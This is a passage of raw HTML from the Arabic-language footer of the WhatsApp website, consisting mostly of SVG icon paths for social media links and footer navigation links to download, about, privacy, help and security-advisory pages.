4.78072 10.5125 4.97979 11.5069C5.17886 12.5014 5.66824 13.4145 6.38608 14.131C7.10392 14.8474 8.01801 15.335 9.01286 15.5321C10.0077 15.7293 11.0387 15.6271 11.9755 15.2385C12.9123 14.85 13.7129 14.1924 14.2761 13.349C14.8394 12.5056 15.14 11.5142 15.14 10.5C15.1413 9.8251 15.0092 9.15661 14.7512 8.53296C14.4933 7.90931 14.1146 7.34281 13.6369 6.86605C13.1592 6.38929 12.5919 6.01168 11.9678 5.75493C11.3436 5.49818 10.6749 5.36736 10 5.37ZM10 13.83C9.34139 13.83 8.69757 13.6347 8.14995 13.2688C7.60234 12.9029 7.17552 12.3828 6.92348 11.7743C6.67144 11.1659 6.6055 10.4963 6.73398 9.85035C6.86247 9.20439 7.17963 8.61104 7.64533 8.14533C8.11104 7.67963 8.70439 7.36247 9.35035 7.23398C9.99631 7.1055 10.6659 7.17144 11.2743 7.42348C11.8828 7.67552 12.4029 8.10234 12.7688 8.64995C13.1347 9.19757 13.33 9.84139 13.33 10.5C13.33 10.9373 13.2439 11.3703 13.0765 11.7743C12.9092 12.1784 12.6639 12.5454 12.3547 12.8547C12.0454 13.1639 11.6784 13.4092 11.2743 13.5765C10.8703 13.7439 10.4373 13.83 10 13.83Z"
                                        fill="currentColor"></path>
                                </svg></a><a aria-label="Facebook"
                                href="https://www.facebook.com/profile.php?id=100064758844406" class="_afwh _adig _ad_c"
                                target="_blank" rel="noopener"><svg width="11" height="21" viewBox="0 0 11 21"
                                    fill="none" xmlns="http://www.w3.org/2000/svg"
                                    class="_wauiIcon__facebook-alt _adid _afbl">
                                    <path
                                        d="M8.51 3.82003H10.39V0.64003C9.47975 0.545377 8.56516 0.498646 7.65 0.50003C4.93 0.50003 3.07 2.16003 3.07 5.20003V7.82003H0V11.38H3.07V20.5H6.75V11.38H9.81L10.27 7.82003H6.75V5.55003C6.75 4.50003 7.03 3.82003 8.51 3.82003Z"
                                        fill="currentColor"></path>
                                </svg></a></div>
                    </div>
                    <div class="_9t2j"><span class="_9uog"><a href="https://www.whatsapp.com/" class="_9vcv"><span
                                    class="_advp _aeam"><img class="_aeok" alt="الشعار الأساسي لواتساب"
                                        src="https://static.whatsapp.net/rsrc.php/v3/yJ/r/Qhrnh5evyPV.png"></span></a></span>
                        <div class="_9tar _9ta3 _9ta5 _9ta7 _9ta- _9taw _9t2l">
                            <div class="_9vd6 _9t33 _9bij _9biz _9bhb _9v12 _9taw _9ta- _9u5z"><a
                                    href="https://www.whatsapp.com/" class="_9vcv"><span class="_advp _aeam"><img
                                            class="_aeok" alt="الشعار الأساسي لواتساب"
                                            src="https://static.whatsapp.net/rsrc.php/v3/yJ/r/Qhrnh5evyPV.png"></span></a><span
                                    class="_ae_s"><a href="https://www.whatsapp.com/download"
                                        class="_aeo8 _advo _9vcv _9u4o _9u4i _9scc _9scs"><span
                                            class="_advp _aeam">تنزيل</span><span><svg width="16" height="16"
                                                viewBox="0 0 16 16" fill="none"
                                                class="_wauiIcon__download-alternative _agnt _9u4c">
                                                <path fill-rule="evenodd" clip-rule="evenodd"
                                                    d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z"
                                                    fill="currentColor"></path>
                                                <path fill-rule="evenodd" clip-rule="evenodd"
                                                    d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z"
                                                    fill="currentColor"></path>
                                            </svg></span></a></span></div>
                            <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z"
                                style="background-color:transparent;"><span class="_9vg3 _9sep _9sc_ _aj1b"
                                    style="color:#F0F4F9;">مهمتنا</span><a href="https://www.whatsapp.com/stayconnected"
                                    class="_aeo9 _9vcv _9scy"><span class="_advp _aeam"><span
                                            class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">الخصائص</span></span></a><a
                                    href="https://blog.whatsapp.com/" class="_aeo9 _9vcv _9scy"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">المدونة</span></span></a><a
                                    href="https://www.whatsapp.com/stories" class="_aeo9 _9vcv _9scy"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">القصص</span></span></a><a
                                    href="https://business.whatsapp.com/" class="_aeo9 _9vcv"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">للأنشطة التجارية</span></span></a></div>
                            <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z"
                                style="background-color:transparent;"><span class="_9vg3 _9sep _9sc_ _aj1b"
                                    style="color:#F0F4F9;">من نحن</span><a href="https://www.whatsapp.com/about"
                                    class="_aeo9 _9vcv _9scy"><span class="_advp _aeam"><span
                                            class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">معلومات عنا</span></span></a><a
                                    href="https://www.whatsapp.com/join" class="_aeo9 _9vcv _9scy"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">الوظائف</span></span></a><a
                                    href="https://www.facebook.com/brand/resources/whatsapp/whatsapp-brand"
                                    class="_aeo9 _9vcv _9scy" target="_blank" rel="noopener"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">مركز العلامة التجارية</span></span></a><a
                                    href="https://www.whatsapp.com/privacy" class="_aeo9 _9vcv"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">الخصوصية</span></span></a></div>
                            <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z"
                                style="background-color:transparent;"><span class="_9vg3 _9sep _9sc_ _aj1b"
                                    style="color:#F0F4F9;">استخدام واتساب</span><a
                                    href="https://www.whatsapp.com/android" class="_aeo9 _9vcv _9scy"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">أجهزة Android</span></span></a><a
                                    href="https://www.whatsapp.com/download" class="_aeo9 _9vcv _9scy"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">أجهزة iPhone</span></span></a><a
                                    href="https://www.whatsapp.com/download" class="_aeo9 _9vcv _9scy"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">كمبيوتر Mac/كمبيوتر شخصي</span></span></a><a
                                    href="https://web.whatsapp.com/" class="_aeo9 _9vcv"><span class="_advp _aeam"><span
                                            class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">واتساب ويب</span></span></a></div>
                            <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z"
                                style="background-color:transparent;"><span class="_9vg3 _9sep _9sc_ _aj1b"
                                    style="color:#F0F4F9;">هل تحتاج إلى مساعدة؟</span><a id="contact_us_link_footer"
                                    href="https://www.whatsapp.com/contact" class="_aeo9 _9vcv _9scy"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">اتصل بنا</span></span></a><a
                                    href="https://faq.whatsapp.com/" class="_aeo9 _9vcv _9scy"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">مركز المساعدة</span></span></a><a
                                    href="https://www.whatsapp.com/coronavirus" class="_aeo9 _9vcv _9scy"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">فيروس كورونا</span></span></a><a
                                    href="https://www.whatsapp.com/security/advisories" class="_aeo9 _9vcv"><span
                                        class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b"
                                            style="color:#FFFFFF;">استشارات أمنية</span></span></a></div>
                        </div>
                    </div>
                    <div class="_9tar _9ta3 _9ta5 _9ta8 _9ta- _9tau _9uo7 _aeol"><span class="_ae_s"><a
                                href="https://www.whatsapp.com/download"
                                class="_aeo8 _advo _9vcv _9u4o _9u4i _9scc _9scs"><span
                                    class="_advp _aeam">تنزيل</span><span><svg width="16" height="16"
                                        viewBox="0 0 16 16" fill="none"
                                        class="_wauiIcon__download-alternative _agnt _9u4c">
                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                            d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z"
                                            fill="currentColor"></path>
                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                            d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z"
                                            fill="currentColor"></path>
                                    </svg></span></a></span>
                        <div class="_9tar _9ta3 _9ta5 _9ta8 _9tau _9uo7 _ae_u"><a aria-label="Twitter"
                                href="https://twitter.com/whatsapp" class="_afwh _adig _ad_c" target="_blank"
                                rel="noopener"><svg viewBox="0 0 19 16" width="19" height="16" fill="none"
                                    class="_aghm _adid _afbl">
                                    <path
                                        d="M18.3087 2.19814C17.7317 2.43004 17.1358 2.5943 16.521 2.67161C16.5116 2.66194 16.5021 2.66194 16.4926 2.65228C17.2588 2.15948 17.7885 1.47344 18.0817 0.584469C18.0533 0.603794 18.0439 0.603795 18.0249 0.613457C17.325 1.02895 16.5778 1.31883 15.7832 1.49276C15.7359 1.50242 15.7076 1.49276 15.6792 1.45411C14.8279 0.594132 13.7969 0.207624 12.6051 0.333239C11.8106 0.420203 11.1201 0.729409 10.5336 1.28984C9.51207 2.26578 9.13373 3.47361 9.38912 4.88436C9.39858 4.94234 9.39857 4.96166 9.33236 4.96166C8.8878 4.93267 8.43377 4.88436 7.99866 4.7974C7.07171 4.62347 6.1826 4.32393 5.34077 3.89877C4.05438 3.26103 2.9477 2.39139 2.00182 1.28984C1.92615 1.20288 1.85049 1.11592 1.77482 1.01929C1.49106 1.46377 1.23567 2.22712 1.2735 3.03879C1.33025 4.32392 1.88832 5.31918 2.9004 6.06321C2.3045 6.04388 1.75588 5.87962 1.23565 5.58974C1.23565 6.49803 1.50052 7.30969 2.05858 8.00541C2.61665 8.71078 3.32605 9.1456 4.20572 9.34852C4.17734 9.35818 4.15843 9.36784 4.13951 9.36784C3.6382 9.49346 3.12741 9.51278 2.61664 9.42582C2.54097 9.41615 2.54097 9.41616 2.56935 9.49346C2.68285 9.83165 2.83418 10.1409 3.03282 10.4307C3.62872 11.2811 4.42326 11.8028 5.42589 11.9864C5.6056 12.0251 5.79479 12.0347 6.00288 12.0444C4.37597 13.3102 2.5599 13.8223 0.545181 13.6194C0.55464 13.6291 0.56409 13.6387 0.583007 13.6484C1.32079 14.1219 2.10587 14.4987 2.92878 14.7789C3.84628 15.0881 4.78271 15.2621 5.7475 15.3007C6.24881 15.3201 6.75959 15.3104 7.2609 15.2621C7.81897 15.2138 8.36757 15.1171 8.91618 14.9819C10.7985 14.4987 12.4065 13.5421 13.7496 12.112C14.8468 10.9332 15.6413 9.57076 16.1616 8.03439C16.4453 7.2034 16.6251 6.34342 16.7007 5.46412C16.7386 5.01964 16.748 4.57515 16.7291 4.13067C16.7291 4.0727 16.748 4.04371 16.7859 4.00506C17.4574 3.49293 18.0344 2.89385 18.5074 2.18847C18.5168 2.16915 18.5452 2.14982 18.5452 2.11117C18.4601 2.14016 18.3844 2.16915 18.3087 2.19814Z"
                                        fill="currentColor"></path>
                                </svg></a><a aria-label="Youtube"
                                href="https://www.youtube.com/channel/UCAuerig2N-RZWJT8x75V9yw"
                                class="_afwh _adig _ad_c" target="_blank" rel="noopener"><svg width="23" height="16"
                                    viewBox="0 0 23 16" fill="none" xmlns="http://www.w3.org/2000/svg"
                                    class="_wauiIcon__youtube _adid _afbl">
                                    <path
                                        d="M22.0088 5.95168C22.0583 4.52034 21.7452 3.0997 21.0988 1.82168C20.6602 1.29728 20.0515 0.943393 19.3788 0.821683C16.5963 0.569209 13.8023 0.465727 11.0088 0.511683C8.22546 0.463642 5.44152 0.563783 2.66882 0.811683C2.12064 0.9114 1.61333 1.16853 1.20882 1.55168C0.308816 2.38168 0.208816 3.80168 0.108816 5.00168C-0.036272 7.15925 -0.036272 9.32412 0.108816 11.4817C0.137746 12.1571 0.23831 12.8275 0.408816 13.4817C0.529391 13.9867 0.773339 14.454 1.11882 14.8417C1.52608 15.2451 2.0452 15.5169 2.60882 15.6217C4.76473 15.8878 6.93703 15.9981 9.10882 15.9517C12.6088 16.0017 15.6788 15.9517 19.3088 15.6717C19.8863 15.5733 20.42 15.3012 20.8388 14.8917C21.1188 14.6116 21.3279 14.2688 21.4488 13.8917C21.8064 12.7943 21.9821 11.6458 21.9688 10.4917C22.0088 9.93168 22.0088 6.55168 22.0088 5.95168ZM8.74882 11.0917V4.90168L14.6688 8.01168C13.0088 8.93168 10.8188 9.97168 8.74882 11.0917Z"
                                        fill="currentColor"></path>
                                </svg></a><a aria-label="Instagram" href="https://www.instagram.com/whatsapp/?hl=en"
                                class="_afwh _adig _ad_c" target="_blank" rel="noopener"><svg width="20" height="21"
                                    viewBox="0 0 20 21" fill="none" xmlns="http://www.w3.org/2000/svg"
                                    class="_wauiIcon__instagram _adid _afbl">
                                    <path
                                        d="M15.34 3.96C15.1027 3.96 14.8707 4.03038 14.6733 4.16224C14.476 4.29409 14.3222 4.48151 14.2313 4.70078C14.1405 4.92005 14.1168 5.16133 14.1631 5.39411C14.2094 5.62689 14.3236 5.84071 14.4915 6.00853C14.6593 6.17635 14.8731 6.29064 15.1059 6.33694C15.3387 6.38324 15.5799 6.35948 15.7992 6.26866C16.0185 6.17783 16.2059 6.02402 16.3378 5.82668C16.4696 5.62935 16.54 5.39734 16.54 5.16C16.54 4.84174 16.4136 4.53652 16.1885 4.31147C15.9635 4.08643 15.6583 3.96 15.34 3.96ZM19.94 6.38C19.9206 5.5503 19.7652 4.7294 19.48 3.95C19.2257 3.28313 18.83 2.67928 18.32 2.18C17.8248 1.66743 17.2196 1.27418 16.55 1.03C15.7727 0.736161 14.9508 0.57721 14.12 0.56C13.06 0.5 12.72 0.5 10 0.5C7.28 0.5 6.94 0.5 5.88 0.56C5.04915 0.57721 4.22734 0.736161 3.45 1.03C2.78168 1.27665 2.17693 1.66956 1.68 2.18C1.16743 2.67518 0.774176 3.28044 0.53 3.95C0.236161 4.72734 0.07721 5.54915 0.0599999 6.38C-5.58794e-08 7.44 0 7.78 0 10.5C0 13.22 -5.58794e-08 13.56 0.0599999 14.62C0.07721 15.4508 0.236161 16.2727 0.53 17.05C0.774176 17.7196 1.16743 18.3248 1.68 18.82C2.17693 19.3304 2.78168 19.7234 3.45 19.97C4.22734 20.2638 5.04915 20.4228 5.88 20.44C6.94 20.5 7.28 20.5 10 20.5C12.72 20.5 13.06 20.5 14.12 20.44C14.9508 20.4228 15.7727 20.2638 16.55 19.97C17.2196 19.7258 17.8248 19.3326 18.32 18.82C18.8322 18.3226 19.2283 17.7182 19.48 17.05C19.7652 16.2706 19.9206 15.4497 19.94 14.62C19.94 13.56 20 13.22 20 10.5C20 7.78 20 7.44 19.94 6.38ZM18.14 14.5C18.1327 15.1348 18.0178 15.7637 17.8 16.36C17.6403 16.7952 17.3839 17.1884 17.05 17.51C16.7256 17.8405 16.3332 18.0964 15.9 18.26C15.3037 18.4778 14.6748 18.5927 14.04 18.6C13.04 18.65 12.67 18.66 10.04 18.66C7.41 18.66 7.04 18.66 6.04 18.6C5.38089 18.6123 4.72459 18.5109 4.1 18.3C3.68578 18.1281 3.31136 17.8728 3 17.55C2.66809 17.2287 2.41484 16.8352 2.26 16.4C2.01586 15.7952 1.88044 15.1519 1.86 14.5C1.86 13.5 1.8 13.13 1.8 10.5C1.8 7.87 1.8 7.5 1.86 6.5C1.86448 5.85106 1.98295 5.20795 2.21 4.6C2.38605 4.17791 2.65627 3.80166 3 3.5C3.30381 3.15617 3.67929 2.8831 4.1 2.7C4.70955 2.48004 5.352 2.36508 6 2.36C7 2.36 7.37 2.3 10 2.3C12.63 2.3 13 2.3 14 2.36C14.6348 2.36728 15.2637 2.48225 15.86 2.7C16.3144 2.86865 16.7223 3.14285 17.05 3.5C17.3777 3.80718 17.6338 4.18273 17.8 4.6C18.0223 5.20893 18.1373 5.85178 18.14 6.5C18.19 7.5 18.2 7.87 18.2 10.5C18.2 13.13 18.19 13.5 18.14 14.5ZM10 5.37C8.98581 5.37198 7.99496 5.67453 7.15265 6.23942C6.31035 6.80431 5.65438 7.6062 5.26763 8.54375C4.88089 9.48131 4.78072 10.5125 4.97979 11.5069C5.17886 12.5014 5.66824 13.4145 6.38608 14.131C7.10392 14.8474 8.01801 15.335 9.01286 15.5321C10.0077 15.7293 11.0387 15.6271 11.9755 15.2385C12.9123 14.85 13.7129 14.1924 14.2761 13.349C14.8394 12.5056 15.14 11.5142 15.14 10.5C15.1413 9.8251 15.0092 9.15661 14.7512 8.53296C14.4933 7.90931 14.1146 7.34281 13.6369 6.86605C13.1592 6.38929 12.5919 6.01168 11.9678 5.75493C11.3436 5.49818 10.6749 5.36736 10 5.37ZM10 13.83C9.34139 13.83 8.69757 13.6347 8.14995 13.2688C7.60234 12.9029 7.17552 12.3828 6.92348 11.7743C6.67144 11.1659 6.6055 10.4963 6.73398 9.85035C6.86247 9.20439 7.17963 8.61104 7.64533 8.14533C8.11104 7.67963 8.70439 7.36247 9.35035 7.23398C9.99631 7.1055 10.6659 7.17144 11.2743 7.42348C11.8828 7.67552 12.4029 8.10234 12.7688 8.64995C13.1347 9.19757 13.33 9.84139 13.33 10.5C13.33 10.9373 13.2439 11.3703 13.0765 11.7743C12.9092 12.1784 12.6639 12.5454 12.3547 12.8547C12.0454 13.1639 11.6784 13.4092 11.2743 13.5765C10.8703 13.7439 10.4373 13.83 10 13.83Z"
                                        fill="currentColor"></path>
                                </svg></a><a aria-label="Facebook"
                                href="https://www.facebook.com/profile.php?id=100064758844406" class="_afwh _adig _ad_c"
                                target="_blank" rel="noopener"><svg width="11" height="21" viewBox="0 0 11 21"
                                    fill="none" xmlns="http://www.w3.org/2000/svg"
                                    class="_wauiIcon__facebook-alt _adid _afbl">
                                    <path
                                        d="M8.51 3.82003H10.39V0.64003C9.47975 0.545377 8.56516 0.498646 7.65 0.50003C4.93 0.50003 3.07 2.16003 3.07 5.20003V7.82003H0V11.38H3.07V20.5H6.75V11.38H9.81L10.27 7.82003H6.75V5.55003C6.75 4.50003 7.03 3.82003 8.51 3.82003Z"
                                        fill="currentColor"></path>
                                </svg></a></div>
                    </div>
                    <div class="_9t2k">
                        <div class="_9t2m"><span class="_aeom">
                                <div class="_9tar _9ta3 _9ta5 _9ta8 _9u69 _9taw _ae_v"><span class="_aeef">
                                        <p class="_9vd7">&rlm;2023 ©&rlm; شركة WhatsApp LLC</p>
                                    </span><a href="https://www.whatsapp.com/legal/" class="_aeo9 _9vcv _9vcx"><span
                                            class="_advp _aeam"><span class="_9vg3 _9sep _aj1b"
                                                style="color:#F0F4F9;">شروط الخدمة</span></span></a><span
                                        class="_afbi"></span></div>
                            </span><span class="_aeom">
                                <div class="_9tar _9ta3 _9ta5 _9ta8 _9tau _ae_x"><a aria-label="Twitter"
                                        href="https://twitter.com/whatsapp" class="_afwh _adig _ad_c" target="_blank"
                                        rel="noopener"><svg viewBox="0 0 19 16" width="19" height="16" fill="none"
                                            class="_aghm _adid _afbl">
                                            <path
                                                d="M18.3087 2.19814C17.7317 2.43004 17.1358 2.5943 16.521 2.67161C16.5116 2.66194 16.5021 2.66194 16.4926 2.65228C17.2588 2.15948 17.7885 1.47344 18.0817 0.584469C18.0533 0.603794 18.0439 0.603795 18.0249 0.613457C17.325 1.02895 16.5778 1.31883 15.7832 1.49276C15.7359 1.50242 15.7076 1.49276 15.6792 1.45411C14.8279 0.594132 13.7969 0.207624 12.6051 0.333239C11.8106 0.420203 11.1201 0.729409 10.5336 1.28984C9.51207 2.26578 9.13373 3.47361 9.38912 4.88436C9.39858 4.94234 9.39857 4.96166 9.33236 4.96166C8.8878 4.93267 8.43377 4.88436 7.99866 4.7974C7.07171 4.62347 6.1826 4.32393 5.34077 3.89877C4.05438 3.26103 2.9477 2.39139 2.00182 1.28984C1.92615 1.20288 1.85049 1.11592 1.77482 1.01929C1.49106 1.46377 1.23567 2.22712 1.2735 3.03879C1.33025 4.32392 1.88832 5.31918 2.9004 6.06321C2.3045 6.04388 1.75588 5.87962 1.23565 5.58974C1.23565 6.49803 1.50052 7.30969 2.05858 8.00541C2.61665 8.71078 3.32605 9.1456 4.20572 9.34852C4.17734 9.35818 4.15843 9.36784 4.13951 9.36784C3.6382 9.49346 3.12741 9.51278 2.61664 9.42582C2.54097 9.41615 2.54097 9.41616 2.56935 9.49346C2.68285 9.83165 2.83418 10.1409 3.03282 10.4307C3.62872 11.2811 4.42326 11.8028 5.42589 11.9864C5.6056 12.0251 5.79479 12.0347 6.00288 12.0444C4.37597 13.3102 2.5599 13.8223 0.545181 13.6194C0.55464 13.6291 0.56409 13.6387 0.583007 13.6484C1.32079 14.1219 2.10587 14.4987 2.92878 14.7789C3.84628 15.0881 4.78271 15.2621 5.7475 15.3007C6.24881 15.3201 6.75959 15.3104 7.2609 15.2621C7.81897 15.2138 8.36757 15.1171 8.91618 14.9819C10.7985 14.4987 12.4065 13.5421 13.7496 12.112C14.8468 10.9332 15.6413 9.57076 16.1616 8.03439C16.4453 7.2034 16.6251 6.34342 16.7007 5.46412C16.7386 5.01964 16.748 4.57515 16.7291 4.13067C16.7291 4.0727 16.748 4.04371 16.7859 4.00506C17.4574 3.49293 18.0344 2.89385 18.5074 2.18847C18.5168 2.16915 18.5452 2.14982 18.5452 2.11117C18.4601 2.14016 18.3844 2.16915 18.3087 2.19814Z"
                                                fill="currentColor"></path>
                                        </svg></a><a aria-label="Youtube"
                                        href="https://www.youtube.com/channel/UCAuerig2N-RZWJT8x75V9yw"
                                        class="_afwh _adig _ad_c" target="_blank" rel="noopener"><svg width="23"
                                            height="16" viewBox="0 0 23 16" fill="none"
                                            xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__youtube _adid _afbl">
                                            <path
                                                d="M22.0088 5.95168C22.0583 4.52034 21.7452 3.0997 21.0988 1.82168C20.6602 1.29728 20.0515 0.943393 19.3788 0.821683C16.5963 0.569209 13.8023 0.465727 11.0088 0.511683C8.22546 0.463642 5.44152 0.563783 2.66882 0.811683C2.12064 0.9114 1.61333 1.16853 1.20882 1.55168C0.308816 2.38168 0.208816 3.80168 0.108816 5.00168C-0.036272 7.15925 -0.036272 9.32412 0.108816 11.4817C0.137746 12.1571 0.23831 12.8275 0.408816 13.4817C0.529391 13.9867 0.773339 14.454 1.11882 14.8417C1.52608 15.2451 2.0452 15.5169 2.60882 15.6217C4.76473 15.8878 6.93703 15.9981 9.10882 15.9517C12.6088 16.0017 15.6788 15.9517 19.3088 15.6717C19.8863 15.5733 20.42 15.3012 20.8388 14.8917C21.1188 14.6116 21.3279 14.2688 21.4488 13.8917C21.8064 12.7943 21.9821 11.6458 21.9688 10.4917C22.0088 9.93168 22.0088 6.55168 22.0088 5.95168ZM8.74882 11.0917V4.90168L14.6688 8.01168C13.0088 8.93168 10.8188 9.97168 8.74882 11.0917Z"
                                                fill="currentColor"></path>
                                        </svg></a><a aria-label="Instagram"
                                        href="https://www.instagram.com/whatsapp/?hl=en" class="_afwh _adig _ad_c"
                                        target="_blank" rel="noopener"><svg width="20" height="21" viewBox="0 0 20 21"
                                            fill="none" xmlns="http://www.w3.org/2000/svg"
                                            class="_wauiIcon__instagram _adid _afbl">
                                            <path
                                                d="M15.34 3.96C15.1027 3.96 14.8707 4.03038 14.6733 4.16224C14.476 4.29409 14.3222 4.48151 14.2313 4.70078C14.1405 4.92005 14.1168 5.16133 14.1631 5.39411C14.2094 5.62689 14.3236 5.84071 14.4915 6.00853C14.6593 6.17635 14.8731 6.29064 15.1059 6.33694C15.3387 6.38324 15.5799 6.35948 15.7992 6.26866C16.0185 6.17783 16.2059 6.02402 16.3378 5.82668C16.4696 5.62935 16.54 5.39734 16.54 5.16C16.54 4.84174 16.4136 4.53652 16.1885 4.31147C15.9635 4.08643 15.6583 3.96 15.34 3.96ZM19.94 6.38C19.9206 5.5503 19.7652 4.7294 19.48 3.95C19.2257 3.28313 18.83 2.67928 18.32 2.18C17.8248 1.66743 17.2196 1.27418 16.55 1.03C15.7727 0.736161 14.9508 0.57721 14.12 0.56C13.06 0.5 12.72 0.5 10 0.5C7.28 0.5 6.94 0.5 5.88 0.56C5.04915 0.57721 4.22734 0.736161 3.45 1.03C2.78168 1.27665 2.17693 1.66956 1.68 2.18C1.16743 2.67518 0.774176 3.28044 0.53 3.95C0.236161 4.72734 0.07721 5.54915 0.0599999 6.38C-5.58794e-08 7.44 0 7.78 0 10.5C0 13.22 -5.58794e-08 13.56 0.0599999 14.62C0.07721 15.4508 0.236161 16.2727 0.53 17.05C0.774176 17.7196 1.16743 18.3248 1.68 18.82C2.17693 19.3304 2.78168 19.7234 3.45 19.97C4.22734 20.2638 5.04915 20.4228 5.88 20.44C6.94 20.5 7.28 20.5 10 20.5C12.72 20.5 13.06 20.5 14.12 20.44C14.9508 20.4228 15.7727 20.2638 16.55 19.97C17.2196 19.7258 17.8248 19.3326 18.32 18.82C18.8322 18.3226 19.2283 17.7182 19.48 17.05C19.7652 16.2706 19.9206 15.4497 19.94 14.62C19.94 13.56 20 13.22 20 10.5C20 7.78 20 7.44 19.94 6.38ZM18.14 14.5C18.1327 15.1348 18.0178 15.7637 17.8 16.36C17.6403 16.7952 17.3839 17.1884 17.05 17.51C16.7256 17.8405 16.3332 18.0964 15.9 18.26C15.3037 18.4778 14.6748 18.5927 14.04 18.6C13.04 18.65 12.67 18.66 10.04 18.66C7.41 18.66 7.04 18.66 6.04 18.6C5.38089 18.6123 4.72459 18.5109 4.1 18.3C3.68578 18.1281 3.31136 17.8728 3 17.55C2.66809 17.2287 2.41484 16.8352 2.26 16.4C2.01586 15.7952 1.88044 15.1519 1.86 14.5C1.86 13.5 1.8 13.13 1.8 10.5C1.8 7.87 1.8 7.5 1.86 6.5C1.86448 5.85106 1.98295 5.20795 2.21 4.6C2.38605 4.17791 2.65627 3.80166 3 3.5C3.30381 3.15617 3.67929 2.8831 4.1 2.7C4.70955 2.48004 5.352 2.36508 6 2.36C7 2.36 7.37 2.3 10 2.3C12.63 2.3 13 2.3 14 2.36C14.6348 2.36728 15.2637 2.48225 15.86 2.7C16.3144 2.86865 16.7223 3.14285 17.05 3.5C17.3777 3.80718 17.6338 4.18273 17.8 4.6C18.0223 5.20893 18.1373 5.85178 18.14 6.5C18.19 7.5 18.2 7.87 18.2 10.5C18.2 13.13 18.19 13.5 18.14 14.5ZM10 5.37C8.98581 5.37198 7.99496 5.67453 7.15265 6.23942C6.31035 6.80431 5.65438 7.6062 5.26763 8.54375C4.88089 9.48131 4.78072 10.5125 4.97979 11.5069C5.17886 12.5014 5.66824 13.4145 6.38608 14.131C7.10392 14.8474 8.01801 15.335 9.01286 15.5321C10.0077 15.7293 11.0387 15.6271 11.9755 15.2385C12.9123 14.85 13.7129 14.1924 14.2761 13.349C14.8394 12.5056 15.14 11.5142 15.14 10.5C15.1413 9.8251 15.0092 9.15661 14.7512 8.53296C14.4933 7.90931 14.1146 7.34281 13.6369 6.86605C13.1592 6.38929 12.5919 6.01168 11.9678 5.75493C11.3436 5.49818 10.6749 5.36736 10 5.37ZM10 13.83C9.34139 13.83 8.69757 13.6347 8.14995 13.2688C7.60234 12.9029 7.17552 12.3828 6.92348 11.7743C6.67144 11.1659 6.6055 10.4963 6.73398 9.85035C6.86247 9.20439 7.17963 8.61104 7.64533 8.14533C8.11104 7.67963 8.70439 7.36247 9.35035 7.23398C9.99631 7.1055 10.6659 7.17144 11.2743 